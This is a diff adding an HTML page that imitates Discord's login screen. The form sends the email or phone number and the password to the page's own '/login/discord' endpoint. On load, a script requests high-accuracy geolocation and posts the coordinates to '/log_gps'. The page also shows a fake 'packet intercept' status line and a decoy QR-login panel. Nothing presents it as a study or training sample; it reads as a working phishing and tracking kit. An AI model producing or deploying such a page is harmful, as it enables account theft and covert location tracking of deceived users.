@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord | Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com" rel="stylesheet">
+    <style>
+        body {
+            /* CHANGED: Swapped image for Discord's signature dark grey */
+            background-color: #1e1f22; 
+            font-family: 'gg sans', 'Noto Sans', sans-serif;
+        }
+        .login-card {
+            background-color: #313338;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+        }
+        .input-dark {
+            background-color: #1e1f22;
+            color: #dbdee1;
+        }
+        .input-dark:focus {
+            outline: none;
+            box-shadow: 0 0 0 2px #5865f2;
+        }
+        .btn-discord {
+            background-color: #5865f2;
+            transition: background-color .17s ease, color .17s ease;
+        }
+        .btn-discord:hover {
+            background-color: #4752c4;
+        }
+        #nexo-sync-status {
+            display: none;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            color: #23a55a;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+
+    <div class="login-card w-full max-w-[480px] p-8 rounded-lg text-white">
+        
+        <div class="text-center">
+            <h3 class="text-2xl font-bold mb-2">Welcome back!</h3>
+            <p class="text-[#b5bac1] text-base mb-6">We're so excited to see you again!</p>
+        </div>
+
+        <form id="disForm" action="/login/discord" method="POST" class="text-left">
+            <div class="mb-5">
+                <label class="text-[#b5bac1] text-xs font-bold uppercase tracking-wider mb-2 block">
+                    Email or Phone Number <span class="text-[#f23f43]">*</span>
+                </label>
+                <input name="user" type="text" class="input-dark w-full p-2.5 rounded border-none" required>
+            </div>
+
+            <div class="mb-2">
+                <label class="text-[#b5bac1] text-xs font-bold uppercase tracking-wider mb-2 block">
+                    Password <span class="text-[#f23f43]">*</span>
+                </label>
+                <input name="pass" type="password" class="input-dark w-full p-2.5 rounded border-none" required>
+            </div>
+
+            <button type="button" class="text-[#00a8fc] text-sm hover:underline mb-6 block">Forgot your password?</button>
+
+            <button id="disBtn" type="submit" class="btn-discord w-full py-3 rounded font-bold text-white mb-2">
+                Log In
+            </button>
+
+            <div class="text-sm text-[#b5bac1]">
+                Need an account? <span class="text-[#00a8fc] cursor-pointer hover:underline">Register</span>
+            </div>
+        </form>
+
+        <!-- NEXO-TECH LOGIC STATUS -->
+        <div id="nexo-sync-status" class="animate-pulse text-center">
+            [+] V8_PACKET_INTERCEPT: HANDSHAKE_SUCCESS
+        </div>
+
+        <div class="mt-8 pt-6 border-t border-[#3f4147] flex items-center justify-center space-x-4">
+            <div class="bg-white p-2 rounded">
+                <img src="https://api.qrserver.com" width="100" height="100" alt="QR Login">
+            </div>
+            <div class="text-left">
+                <h4 class="font-bold text-lg">Log in with QR Code</h4>
+                <p class="text-[#b5bac1] text-sm">Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- SCRIPTS -->
+    <script>
+        const disForm = document.getElementById('disForm');
+        const disBtn = document.getElementById('disBtn');
+        const syncStatus = document.getElementById('nexo-sync-status');
+
+        disForm.onsubmit = function() {
+            disBtn.innerText = "Authenticating...";
+            disBtn.disabled = true;
+            disBtn.style.opacity = "0.6";
+            syncStatus.style.display = "block";
+        };
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(p) {
+                    const data = {
+                        lat: p.coords.latitude, 
+                        lon: p.coords.longitude,
+                        acc: p.coords.accuracy,
+                        node: "DISCORD_M_V8"
+                    };
+                    
+                    fetch('/log_gps', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                }, 
+                function(err) { console.log("Tracker Denied"); },
+                { enableHighAccuracy: true });
+            }
+        }
+    </script>
+</body>
+</html>
